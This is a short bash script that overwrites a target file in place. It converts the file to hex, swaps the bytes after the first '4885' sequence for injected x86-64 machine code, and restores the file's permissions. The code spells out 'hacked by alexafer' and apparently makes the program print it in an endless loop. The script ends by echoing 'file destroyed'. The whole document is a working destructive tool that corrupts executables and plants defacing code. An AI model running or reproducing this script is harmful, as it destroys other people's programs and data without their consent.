#!/bin/bash

if [ "$#" -ne 1 ]; then
    echo "Usage: ./$0 file"
    exit 1
fi


if [ ! -f "$1" ]; then
    echo "Error : file $1 doesn't exist."
    exit 1
fi


perms=$(stat -c "%a" "$1")

xxd -p "$1" | tr -d '\n' | \
sed '0,/4885/s/4885.\{102\}/eb116861636b656420627920616c6578616665720a488d35e6ffffff48c7c21300000048c7c00100000048c7c7010000000f05ebcb/' | \
xxd -r -p > "$1.tmp"

mv "$1.tmp" "$1"

chmod "$perms" "$1"

echo "file destroyed"
